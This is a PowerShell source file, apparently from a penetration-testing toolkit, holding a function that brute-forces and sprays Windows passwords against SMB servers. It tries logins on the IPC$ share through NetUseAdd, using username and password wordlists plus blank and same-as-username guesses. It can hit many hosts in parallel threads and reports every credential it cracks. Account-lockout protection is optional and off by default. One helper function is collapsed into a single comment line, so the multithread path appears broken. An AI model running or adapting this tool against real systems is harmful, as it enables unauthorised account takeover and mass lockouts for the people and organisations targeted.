<#
 
.SYNOPSIS
Attempts to logon to a SMB server using the supplied Windows credentials.
 
.DESCRIPTION
This tool attempts to login to a remote SMB server using the Windows login credentials provided as arguments. It does this by attempting to establish a connection to the IPC$ share on the remote host, using the credentials to be tested. The connection is established using the NetUseAdd function exposed in NetApi32.

The tool outputs a Credential object for each valid credential identified.

.PARAMETER Target
The target host, specified as a single hostname or IP address. The tool also supports multiple targets as computer objects through the pipeline.

.PARAMETER Username
One or multiple usernames to be used for login attempts. This will prevent inclusion of logins stored in the "Users" property of the computer object.

.PARAMETER Password
One or multiple passwords to be tested for each username.

.PARAMETER UserList
The absolute path to a file containing usernames (one username per line)

.PARAMETER PassList
The absolute path to a file containing passwords (one password per line)

.PARAMETER UserSpecial
Adds "special" usernames including:
- BuiltIn: Include the built-in accounts "Guest" and "SUPPORT_388945a0"

.PARAMETER PassSpecial
Adds "special" passwords including:
- SameAsUser: Lower-case username as password
- Blank: Empty password

.PARAMETER Domain
A Windows domain that is passed with the username(s).

.PARAMETER SafetyThreshold
Sets the number of concurrent account lockouts to occur before the tool stops all processing. This parameter can be used to reduce the risk of mass lockout. By default, no account lockout threshold is set.

Warning: If the number of password guesses precisely match the account lockout threshold in Windows, mass lockout can still occur.

.PARAMETER MultiThread
Enables multi-threading, where each target is processed by its own thread.

.PARAMETER ThreadLimit
The maximum number of threads that will be assigned when multi-threading. The default value is 20.

.PARAMETER ShowProgress
Enables a progress bar.

.PARAMETER SuppressMessages
Prevents event messages from being printed to the screen.

.EXAMPLE
<computer objects>| NME-SMB-TestCredentials -Password foobar,password

.EXAMPLE
<computer objects>| NME-SMB-TestCredentials -Username Administrator -Password Summer15 |Format-Table -AutoSize

.EXAMPLE
NME-SMB-TestCredentials -Target 192.168.56.22 -PassList C:\Passwords.txt -Special Blank,SameAsUser

.EXAMPLE
<host objects>|?{$_.IPAddress -like "192.168.5*"} |NME-SMB-TestCredentials -Password P4ssw0rd -MultiThread -ShowProgress -SuppressMessages

.NOTES

Module dependencies
-------------------
- Environment: HelperFunctions, CreateObjects

Data update policy
------------------
- Creates new Credential objects, updates the "Password" property on existing.

Issues / Other
--------------
- Still using native import of C# code to access NetUseAdd and NetUseDel (see bottom section of this script) - Getting error 87 from the NetUseAdd function when using PSReflect and pure powershell code...

.LINK
NetUseAdd (NetApi32):
- https://msdn.microsoft.com/en-us/library/windows/desktop/aa370645%28v=vs.85%29.aspx

NetUseDel (NetApi32):
- https://msdn.microsoft.com/en-us/library/windows/desktop/aa370646%28v=vs.85%29.aspx

#>

Function Test-SMBCredentials
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory,ValueFromPipelineByPropertyName)]
        [Alias('IPAddress')]
        [string]$Target,

        [Parameter()]
        [string[]]$Username,

        [Parameter()]
        [string[]]$Password,

        [Parameter()]
        [string]$UserList,

        [Parameter()]
        [string]$PassList,

        [Parameter()]
        [ValidateSet('BuiltIn')]
        [string[]]$UserSpecial,

        [Parameter()]
        [ValidateSet('SameAsUser','Blank')]
        [string[]]$PassSpecial,

        [Parameter()]
        [string]$Domain,
        
        [Parameter()]
        [Int]$SafetyThreshold,

        [Parameter()]
        [switch]$MultiThread,

        [Parameter()]
        [int]$ThreadLimit = 20,

        [Parameter()]
        [switch]$ShowProgress,

        [Parameter()]
        [switch]$SuppressMessages
    )

    BEGIN
    {
        #Default functions/variables
        $CmdName = 'Test-SMBCredentials'
        $CmdAlias = 'NME-SMB-TestCredentials'
        $Results = @()

        if($PSBoundParameters['Verbose'])
        {
            $VerboseEnabled = $true
        }

        if($ShowProgress -and $MyInvocation.CommandOrigin -eq 'Runspace') #'CommandOrigin -eq Runspace' will prevent execution of block when in a threaded context
        {
            $PipeInput = $MyInvocation.Line

            if($PipeInput -match $CmdName)
            {
                $PipeExp = $PipeInput.Substring(0, $PipeInput.IndexOf($CmdName)).trimend(' |')
            }
            else
            {
                $PipeExp = $PipeInput.Substring(0, $PipeInput.IndexOf($CmdAlias)).trimend(' |')
            }

            if($PipeExp) #Determines number of targets coming through pipe
            {
                $TargetsTotal = (Invoke-Expression $PipeExp| Measure-Object).Count
            }
            else #If no pipe expression, number of targets will be 1
            {
                $TargetsTotal = 1
            }

            #Synchronized array so that data can data can be shared propertly in multithread mode
            $Counter = [hashtable]::Synchronized(@{
                Total = $TargetsTotal
                Done = 0
            })
        }

        if($MultiThread) #Preparing multi-thread environment
        {
            if($Target)
            {
                $message = 'Multithreading not supported for a single target'
                LogEvent -Command $CmdName -Severity Err -Event $message -ToConsole 

                break
            }

            #Command-specific input to multithreading
            $ScriptBlock = $MyInvocation.MyCommand.Definition
            $ImportModules = @('HelperFunctions','CreateObjects','PSReflect')
            $ImportVariables = @('NMEObjects','NMEVars','Counter')

            foreach ($key in $MyInvocation.BoundParameters.Keys) #Creates a string of parameters that is passed to the powershell::create() command
            {
                if(($key -ne 'MultiThread') -and ($key -ne 'ThreadLimit') -and ($key -ne 'Target'))
                {
                    if(($($MyInvocation.BoundParameters.Item($key)) -eq $true) -or ($($MyInvocation.BoundParameters.Item($key)) -eq $false)) #Switch params
                    {
                        $ParamString += ".AddParameter(`"$key`")"
                    }
                    else
                    {
                        if($MyInvocation.BoundParameters.Item($key) -is [system.array]) #String-array params
                        {
                            $ArrToString = ($MyInvocation.BoundParameters.Item($key) -join '","').insert(0,'"') + '"'
                            $ParamString += ".AddParameter(`"$key`",@($ArrToString))"
                        }
                        else #Single-string params
                        {
                            $ParamString += ".AddParameter(`"$key`",`"$($MyInvocation.BoundParameters.Item($key))`")"
                        }
                    }
                }
            }

            # Configuring initial session state
            $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

            if($ImportModules) #Importing modules into the iss
            {
                foreach($mod in $ImportModules)
                {
                    $modules += @($NMEModules."$mod")
                }

                $iss.ImportPSModule($modules)
            }

            if($ImportVariables) #Importing variables into the iss
            {
                foreach($var in $ImportVariables)
                {
                    $varEntry = New-Object System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList "$var",(Invoke-Expression ('$' + "$var")),$null
                    $iss.Variables.Add($varEntry)
                }
            }

            # Setting up runspace pool
            $runspacepool = [runspacefactory]::CreateRunspacePool(1, $ThreadLimit, $iss, $host)
            $runspacepool.Open()

            #Building powershell command
            $Command = [scriptblock]::Create("[powershell]::Create().AddScript(`$ScriptBlock).AddParameter(`"Target`",`$Target)" + $ParamString)

            #Creating array for storing threads, handles and job results
            $JobsArray = New-Object System.Collections.ArrayList

            $message = 'Starting multi-thread processing'
            LogEvent -Command $CmdName -Severity Info -Event $message -ToFile -ToConsole

            Function GetResults #Defining function for monitoring jobs and fetching results            {			    param                (                    [switch]$WaitForCompletion                )                			    do                {				    $HasData = $false                    foreach($job in $jobsArray)                    {					    if ($job.Handle.isCompleted)                        {                            $job.Result = $job.Thread.EndInvoke($job.Handle)						    $job.Thread.dispose()						    $job.Handle = $null						    $job.Thread = $null					    }                        elseif ($job.Handle -ne $null)                        {						    $HasData = $true					    }				    }				    if ($HasData -and $WaitForCompletion)                    {                        Start-Sleep -Milliseconds 100                    }			    } while ($HasData -and $WaitForCompletion)		    }
        }
        else #Preparation for normal execution
        {
            $SuccessCodes = @(0,1327,1331,1907)

            #Building initial password array
            $PwdArray = @()

            if ($PassList)
            {
                if( !(Test-Path $PassList))
                {
                    $message = 'Cannot find a wordlist at the path provided'
                    LogEvent -command $CmdName -severity Err -event $message -ToFile -ToConsole 
                
                    break
                }
                else
                {
                    $PwdArray += (Get-Content $PassList)
                }
            }

            if($Password)
            {
                foreach($p in $Password)
                {
                    $PwdArray += $p
                }
            }

            switch ($PassSpecial)
            {
                { ! $_ }                 { break }
                { $_.Contains('Blank') } { $PwdArray += ""; }
            }

            #Building initial username array
            $UserArray = @()

            if($UserList)
            {
                if( !(Test-Path $UserList))
                {
                    $message = 'Cannot find a username list at the provided path'
                    LogEvent -Source $CmdName -Severity Err -Event $message -ToConsole 
                
                    break
                }
                else
                {
                    $UserArray += (Get-Content $UserList)
                }
            }

            if($Username)
            {
                foreach($u in $Username)
                {
                    $UserArray += $u
                }
            }
        }
    }

    PROCESS
    {
        if($MultiThread) #Invoking new thread for each target in pipe and storing threads/handles/results in jobsArray
        {
            $thread = Invoke-Command $Command
            $thread.RunspacePool = $runspacepool
            $rcvObj = "" | Select-Object Handle, Thread, Result
            $rcvObj.Thread = $thread
            $rcvObj.Handle = $thread.BeginInvoke()
            [void]$jobsArray.Add($rcvObj)

            GetResults
        }
        else #Main execution
        {
            #Shared variables
            $ObjArray = @()
            $unc = "\\$Target\ipc$"
            $LockCount = 0

            $CompObj = Get-ComputerObject -IP $Target -OnlyFromArray

            if(! $CompObj)
            {
                $message = "Unable to find computer object for '$($target)'"
                LogEvent -Command $CmdName -Severity Err -Event $message -ToFile -ToConsole

                return
            }

            if($UserArray.Count -eq 0)
            {
                $UserArray += $CompObj.Users.Name
            }

            #Adding/removing iteration-specific usernames, based on userspecial param input
            switch($UserSpecial)
            {
                { ! $_ }                          { break }
                { ! $_.Contains('BuiltIn') } { $UserArray = $UserArray|?{$_ -ne  'Guest' -and $_ -ne 'SUPPORT_388945a0'}; break }
            }

            if($UserArray)
            {
                $message = "Guessing passwords against user account(s)"
                LogEvent -source $Target -command $CmdName -severity Info -event $message -ToFile -ToConsole #Maybe verbose only (only highlight successes and failures (like locked or other error))

                $LastLocked = $false

                foreach($User in $UserArray) #Iterate through each user in list
                {
                    if($SafetyThreshold -and ($LockCount -eq $SafetyThreshold))
                    {
                        $message = "Safety threshold for locked accounts hit - further processing stopped"
                        LogEvent -source $Target -command $CmdName -severity Err -event $message -ToFile -ToConsole

                        Return
                    }
                    else
                    {
                        #Adding iteration-specific passwords
                        $IterationPwd = @()
                
                        switch ($PassSpecial)
                        {
                            { ! $_ }                      { break }
                            { $_.Contains('SameAsUser') } { $IterationPwd += $User.ToLower() }
                        }

                        if($PwdArray.count -ne 0)
                        {
                            foreach($pwd in $PwdArray) #Iterate through each password in list
                            {

                                $ParamErrorIndex = $null

                                $useInfo = New-Object ([NativeTestPasswords+USE_INFO_2]) -Property @{
                                    ui2_local      = $null
                                    ui2_remote     = $unc
                                    ui2_password   = $pwd
                                    ui2_asg_type   = 3
                                    ui2_usecount   = 1
                                    ui2_username   = $user
                                    ui2_domainname = $domain
                                } #Create USE_INFO_2 object used by NetUseAdd to issue the request

                                $message = [NativeTestPasswords]::NetUseAdd($null, 2, [ref]$useInfo, [ref]$paramErrorIndex)
                                #$errCode = $Netapi32::NetUseAdd($null, 2, [ref]$useInfo, [ref]$paramErrorIndex)
                    
                                if($message -eq 1326)
                                {
                                    Write-Verbose "[$Target`:$User] The user name or password is incorrect"
                                }
                                elseif($message -eq 1909)
                                {
                                    $LastLocked = $true
                                    $LockCount++

                                    $message = 'The referenced account is currently locked out and may not be logged on to'

                                    if($SuppressMessages)
                                    {
                                        LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Err -Event $message -ToFile
                                    }
                                    else
                                    {
                                        LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Err -Event $message -ToFile -ToConsole
                                    }

                                    break
                                }
                                elseif($SuccessCodes -contains $message)
                                {
                                    $LastLocked = $false
                                    $LockCount = 0

                                    if($message -eq 0)
                                    {
                                        [NativeTestPasswords]::NetUseDel($null, $unc, 2) |Out-Null

                                        $message = "Password found ($pwd)"

                                        if($SuppressMessages)
                                        {
                                            LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Succ -Event $message -ToFile
                                        }
                                        else
                                        {
                                            LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Succ -Event $message -ToFile -ToConsole
                                        }
                                    }
                                    else
                                    {
                                        switch ($message)
                                        {
                                            1327 {$Status = 'Account restrictions are preventing this user from signing in'; break}
                                            1331 {$Status = 'Account is currently disabled'; break}
                                            1907 {$Status = 'Password must be changed before signing in'; break}
                                            Default {}
                                        }

                                        $message = "Password found ($pwd) but: $Status"

                                        if($SuppressMessages)
                                        {
                                            LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Warn -Event $message -ToFile
                                        }
                                        else
                                        {
                                            LogEvent -Source "$($Target):$($User)" -Command $CmdName -Severity Warn -Event $message -ToFile -ToConsole
                                        }
                                    }

                                    if($Domain)
                                    {
                                        $CredObj = Get-CredentialObject -Username $User -CredType WinDomain -AuthService $Domain
                                    }
                                    else
                                    {
                                        $CredObj = Get-CredentialObject -Username $User -CredType WinSAM -AuthService $Target
                                    }

                                    $CredObj.Password = $pwd

                                    $Results += $CredObj| Select-Object * |Add-Member Status $Status -PassThru

                                    $Status = $null

                                    break
                                }
                                else
                                {
                                    if($SuppressMessages)
                                    {
                                        LogEvent -Source "$($Target):$($User)" -Command $CmdName -Event $message -Native -ToFile
                                    }
                                    else
                                    {
                                        LogEvent -Source "$($Target):$($User)" -Command $CmdName -Event $message -Native -ToFile -ToConsole
                                    }
                                }
                            }

                            foreach($p in $IterationPwd) #Removes user-specific password from list
                            {
                                $PwdArray = @($PwdArray|?{$_ -ne $p})
                            }
                        }
                        else
                        {
                            Write-Verbose 'No applicable passwords found (skipping)'
                            Return
                        }
                    }
                }
            }
            else
            {
                Write-Verbose 'No applicable users found (skipping)'
                Return
            }
        }
    }

    END
    {
        if($MultiThread)
        {
            GetResults -WaitForCompletion

            $message = 'Multi-thread processing completed'
            LogEvent -Command $CmdName -Severity Info -Event $message -ToFile -ToConsole

            Write-Host ""
            Write-Output $JobsArray.Result
        }
        else
        {
            Write-Output $Results
        }
    }
}

$Native = @'
using System;
using System.Runtime.InteropServices;
using System.Text;
    
public class NativeTestPasswords
{
    [DllImport("NetApi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUseAdd(
        string UncServerName,
        int Level,
        ref USE_INFO_2 Buf,
        out int ParmError
        );

    [DllImport("NetApi32.dll", CharSet = CharSet.Unicode)]
    public static extern int NetUseDel(
        string UncServerName,
        string UseName,
        int ForceCond
        );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USE_INFO_2
    {
        public string ui2_local;
        public string ui2_remote;
        public string ui2_password;
        public int ui2_status;
        public int ui2_asg_type;
        public int ui2_refcount;
        public int ui2_usecount;
        public string ui2_username;
        public string ui2_domainname;
    }
}
'@

Add-Type -TypeDefinition $Native